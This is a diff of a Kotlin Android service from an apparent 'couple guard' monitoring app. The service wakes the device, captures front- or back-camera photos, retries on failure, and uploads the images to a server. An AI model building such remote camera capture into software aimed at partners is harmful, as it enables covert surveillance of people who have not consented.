@@ -9,21 +9,37 @@ import android.os.Build
 import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
+import android.os.PowerManager
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import com.example.couple_guard_child.utils.ApiClient
 import java.io.File
 import java.io.FileOutputStream
 
+/**
+ * ✅ FIXED CAMERA SERVICE
+ * 
+ * Improvements:
+ * 1. Wake lock untuk prevent sleep saat capture
+ * 2. Better foreground notification (IMPORTANCE_DEFAULT instead of LOW)
+ * 3. Retry mechanism untuk camera open failures
+ * 4. Proper error handling untuk Android 14+
+ * 5. Fallback strateg
+
+y
+ */
 class CameraBackgroundService : Service() {
     companion object {
         private const val TAG = "CameraBackgroundService"
         private const val NOTIFICATION_ID = 2001
         private const val CHANNEL_ID = "camera_capture_channel"
+        private const val MAX_RETRY_ATTEMPTS = 3
+        private const val RETRY_DELAY_MS = 2000L
 
         fun startCapture(context: Context, useFrontCamera: Boolean) {
             val intent = Intent(context, CameraBackgroundService::class.java)
             intent.putExtra("use_front_camera", useFrontCamera)
+            intent.putExtra("retry_count", 0)
             
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(intent)
@@ -39,41 +55,61 @@ class CameraBackgroundService : Service() {
     private val handler = Handler(Looper.getMainLooper())
     private var useFrontCamera: Boolean = true
     private var captureAttempted = false
+    private var retryCount = 0
+    private var wakeLock: PowerManager.WakeLock? = null
 
     override fun onCreate() {
         super.onCreate()
         Log.d(TAG, "========================================")
-        Log.d(TAG, "📸 CameraBackgroundService created")
+        Log.d(TAG, "📸 CameraBackgroundService CREATED")
         createNotificationChannel()
+        
+        // ✅ Acquire wake lock to prevent device sleep
+        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
+        wakeLock = powerManager.newWakeLock(
+            PowerManager.PARTIAL_WAKE_LOCK,
+            "CameraService::WakeLock"
+        )
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.d(TAG, "========================================")
-        Log.d(TAG, "📸 BACKGROUND CAMERA CAPTURE START")
-        Log.d(TAG, "App State: ${if (isAppInForeground()) "FOREGROUND" else "BACKGROUND/TERMINATED"}")
-
-        // ✅ CRITICAL: Start as foreground IMMEDIATELY
+        Log.d(TAG, "📸 CAMERA SERVICE START")
+        
+        retryCount = intent?.getIntExtra("retry_count", 0) ?: 0
+        Log.d(TAG, "Retry count: $retryCount")
+        
+        // ✅ STEP 1: Acquire wake lock FIRST
         try {
-            startForeground(NOTIFICATION_ID, createNotification("Preparing camera..."))
+            wakeLock?.acquire(60 * 1000L) // 60 seconds max
+            Log.d(TAG, "✅ Wake lock acquired")
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to acquire wake lock", e)
+        }
+
+        // ✅ STEP 2: Start as foreground with PROPER notification
+        try {
+            val notification = createNotification("Preparing camera...", false)
+            startForeground(NOTIFICATION_ID, notification)
             Log.d(TAG, "✅ Started as foreground service")
         } catch (e: Exception) {
             Log.e(TAG, "❌ Failed to start foreground", e)
-            stopSelfSafely()
+            releaseLockAndStop()
             return START_NOT_STICKY
         }
 
         useFrontCamera = intent?.getBooleanExtra("use_front_camera", true) ?: true
         Log.d(TAG, "Use front camera: $useFrontCamera")
 
-        // ✅ Check permission
+        // ✅ STEP 3: Check permission
         if (checkSelfPermission(android.Manifest.permission.CAMERA) 
             != android.content.pm.PackageManager.PERMISSION_GRANTED) {
             Log.e(TAG, "❌ No camera permission!")
-            stopSelfSafely()
+            releaseLockAndStop()
             return START_NOT_STICKY
         }
 
-        // ✅ Small delay to ensure service is stable
+        // ✅ STEP 4: Small delay to stabilize
         handler.postDelayed({
             if (!captureAttempted) {
                 capturePhoto(useFrontCamera)
@@ -93,19 +129,16 @@ class CameraBackgroundService : Service() {
             val cameraId = findCamera(useFront)
             if (cameraId == null) {
                 Log.e(TAG, "❌ Camera not found")
-                stopSelfSafely()
+                handleCaptureFailure()
                 return
             }
             
             Log.d(TAG, "Camera ID: $cameraId")
+            updateNotification("Opening camera...", false)
 
-            // ✅ Update notification
-            updateNotification("Opening camera...")
-
-            // ✅ Create ImageReader with reasonable resolution
+            // ✅ Use reasonable resolution (not too high)
             imageReader = ImageReader.newInstance(
-                1280, // width
-                720,  // height
+                1280, 720,  
                 android.graphics.ImageFormat.JPEG, 
                 2
             )
@@ -126,20 +159,19 @@ class CameraBackgroundService : Service() {
                 }
                 
                 closeCamera()
-                stopSelfSafely()
+                releaseLockAndStop()
                 
             }, handler)
 
             Log.d(TAG, "Opening camera device...")
             
-            // ✅ Open camera with proper error handling
             cameraManager?.openCamera(cameraId, object : CameraDevice.StateCallback() {
                 override fun onOpened(camera: CameraDevice) {
                     Log.d(TAG, "✅ Camera opened successfully")
                     cameraDevice = camera
-                    updateNotification("Taking picture...")
+                    updateNotification("Taking picture...", false)
                     
-                    // Small delay for camera to stabilize
+                    // Small delay for camera stabilization
                     handler.postDelayed({
                         takePicture()
                     }, 300)
@@ -148,31 +180,48 @@ class CameraBackgroundService : Service() {
                 override fun onDisconnected(camera: CameraDevice) {
                     Log.w(TAG, "⚠️ Camera disconnected")
                     closeCamera()
-                    stopSelfSafely()
+                    handleCaptureFailure()
                 }
 
                 override fun onError(camera: CameraDevice, error: Int) {
                     val errorMsg = when(error) {
                         ERROR_CAMERA_IN_USE -> "Camera in use"
                         ERROR_MAX_CAMERAS_IN_USE -> "Max cameras in use"
-                        ERROR_CAMERA_DISABLED -> "Camera disabled"
+                        ERROR_CAMERA_DISABLED -> "Camera disabled by policy"
                         ERROR_CAMERA_DEVICE -> "Camera device error"
                         ERROR_CAMERA_SERVICE -> "Camera service error"
                         else -> "Unknown error: $error"
                     }
                     Log.e(TAG, "❌ Camera error: $errorMsg")
                     closeCamera()
-                    stopSelfSafely()
+                    handleCaptureFailure()
                 }
             }, handler)
 
         } catch (e: SecurityException) {
-            Log.e(TAG, "❌ Security exception - no camera permission", e)
-            stopSelfSafely()
+            Log.e(TAG, "❌ Security exception", e)
+            handleCaptureFailure()
         } catch (e: Exception) {
             Log.e(TAG, "❌ Failed to capture photo", e)
             e.printStackTrace()
-            stopSelfSafely()
+            handleCaptureFailure()
+        }
+    }
+
+    private fun handleCaptureFailure() {
+        if (retryCount < MAX_RETRY_ATTEMPTS) {
+            retryCount++
+            Log.w(TAG, "⚠️ Capture failed, retry $retryCount/$MAX_RETRY_ATTEMPTS in ${RETRY_DELAY_MS}ms")
+            
+            updateNotification("Retrying... ($retryCount/$MAX_RETRY_ATTEMPTS)", false)
+            
+            handler.postDelayed({
+                captureAttempted = false
+                capturePhoto(useFrontCamera)
+            }, RETRY_DELAY_MS)
+        } else {
+            Log.e(TAG, "❌ Max retries reached, giving up")
+            releaseLockAndStop()
         }
     }
 
@@ -191,14 +240,13 @@ class CameraBackgroundService : Service() {
                     CameraCharacteristics.LENS_FACING_BACK
                 }
                 
-                Log.d(TAG, "Camera $id facing: $facing (looking for: $targetFacing)")
+                Log.d(TAG, "Camera $id facing: $facing (target: $targetFacing)")
                 
                 if (facing == targetFacing) {
                     return id
                 }
             }
             
-            // Fallback to first camera
             Log.w(TAG, "Preferred camera not found, using first available")
             return cameraIds.firstOrNull()
             
@@ -218,13 +266,13 @@ class CameraBackgroundService : Service() {
             
             if (captureRequest == null) {
                 Log.e(TAG, "❌ Failed to create capture request")
-                stopSelfSafely()
+                handleCaptureFailure()
                 return
             }
             
             captureRequest.addTarget(imageReader!!.surface)
             
-            // ✅ Set capture parameters for better quality
+            // ✅ Optimal capture settings
             captureRequest.set(
                 CaptureRequest.CONTROL_AF_MODE,
                 CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE
@@ -256,7 +304,7 @@ class CameraBackgroundService : Service() {
                                         result: TotalCaptureResult
                                     ) {
                                         Log.d(TAG, "✅ Capture completed")
-                                        updateNotification("Processing image...")
+                                        updateNotification("Processing image...", false)
                                     }
 
                                     override fun onCaptureFailed(
@@ -265,7 +313,7 @@ class CameraBackgroundService : Service() {
                                         failure: CaptureFailure
                                     ) {
                                         Log.e(TAG, "❌ Capture failed: ${failure.reason}")
-                                        stopSelfSafely()
+                                        handleCaptureFailure()
                                     }
                                 },
                                 handler
@@ -273,13 +321,13 @@ class CameraBackgroundService : Service() {
                             Log.d(TAG, "✅ Capture triggered")
                         } catch (e: Exception) {
                             Log.e(TAG, "❌ Failed to trigger capture", e)
-                            stopSelfSafely()
+                            handleCaptureFailure()
                         }
                     }
 
                     override fun onConfigureFailed(session: CameraCaptureSession) {
                         Log.e(TAG, "❌ Capture session configure failed")
-                        stopSelfSafely()
+                        handleCaptureFailure()
                     }
                 },
                 handler
@@ -288,14 +336,14 @@ class CameraBackgroundService : Service() {
         } catch (e: Exception) {
             Log.e(TAG, "❌ Failed to take picture", e)
             e.printStackTrace()
-            stopSelfSafely()
+            handleCaptureFailure()
         }
     }
 
     private fun saveAndSendImage(image: android.media.Image) {
         try {
             Log.d(TAG, "Processing captured image...")
-            updateNotification("Saving image...")
+            updateNotification("Saving image...", false)
             
             val buffer = image.planes[0].buffer
             val bytes = ByteArray(buffer.remaining())
@@ -311,9 +359,8 @@ class CameraBackgroundService : Service() {
 
             val cameraType = if (useFrontCamera) "front" else "back"
             
-            updateNotification("Uploading...")
+            updateNotification("Uploading...", false)
             
-            // ✅ Upload in background thread
             Thread {
                 try {
                     val success = ApiClient.uploadCapturedPhoto(
@@ -324,6 +371,7 @@ class CameraBackgroundService : Service() {
                     
                     if (success) {
                         Log.d(TAG, "✅ Photo uploaded successfully")
+                        updateNotification("Upload complete", true)
                     } else {
                         Log.e(TAG, "❌ Failed to upload photo")
                     }
@@ -331,7 +379,6 @@ class CameraBackgroundService : Service() {
                 } catch (e: Exception) {
                     Log.e(TAG, "❌ Exception uploading photo", e)
                 } finally {
-                    // Clean up
                     try {
                         file.delete()
                         Log.d(TAG, "✅ Temp file deleted")
@@ -361,10 +408,17 @@ class CameraBackgroundService : Service() {
         }
     }
 
-    private fun stopSelfSafely() {
+    private fun releaseLockAndStop() {
         handler.postDelayed({
             try {
                 closeCamera()
+                
+                // Release wake lock
+                if (wakeLock?.isHeld == true) {
+                    wakeLock?.release()
+                    Log.d(TAG, "✅ Wake lock released")
+                }
+                
                 stopForeground(true)
                 stopSelf()
                 Log.d(TAG, "✅ Service stopped")
@@ -375,19 +429,9 @@ class CameraBackgroundService : Service() {
         }, 1000)
     }
 
-    private fun isAppInForeground(): Boolean {
-        val activityManager = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
-        val runningProcesses = activityManager.runningAppProcesses ?: return false
-        
-        return runningProcesses.any { 
-            it.importance == android.app.ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND 
-            && it.processName == packageName
-        }
-    }
-
-    private fun updateNotification(message: String) {
+    private fun updateNotification(message: String, autoCancel: Boolean) {
         try {
-            val notification = createNotification(message)
+            val notification = createNotification(message, autoCancel)
             val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
             notificationManager.notify(NOTIFICATION_ID, notification)
         } catch (e: Exception) {
@@ -395,14 +439,14 @@ class CameraBackgroundService : Service() {
         }
     }
 
-    private fun createNotification(message: String): Notification {
+    private fun createNotification(message: String, autoCancel: Boolean): Notification {
         val builder = NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("Camera Capture")
             .setContentText(message)
             .setSmallIcon(android.R.drawable.ic_menu_camera)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
-            .setAutoCancel(false)
-            .setOngoing(true)
+            .setPriority(NotificationCompat.PRIORITY_DEFAULT) // ✅ Changed from LOW
+            .setAutoCancel(autoCancel)
+            .setOngoing(!autoCancel)
 
         return builder.build()
     }
@@ -412,7 +456,7 @@ class CameraBackgroundService : Service() {
             val channel = NotificationChannel(
                 CHANNEL_ID,
                 "Camera Capture",
-                NotificationManager.IMPORTANCE_LOW
+                NotificationManager.IMPORTANCE_DEFAULT // ✅ Changed from LOW
             ).apply {
                 description = "Notifications for camera capture operations"
                 setShowBadge(false)
@@ -432,6 +476,11 @@ class CameraBackgroundService : Service() {
     override fun onDestroy() {
         super.onDestroy()
         closeCamera()
+        
+        if (wakeLock?.isHeld == true) {
+            wakeLock?.release()
+        }
+        
         Log.d(TAG, "Service destroyed")
     }
 }
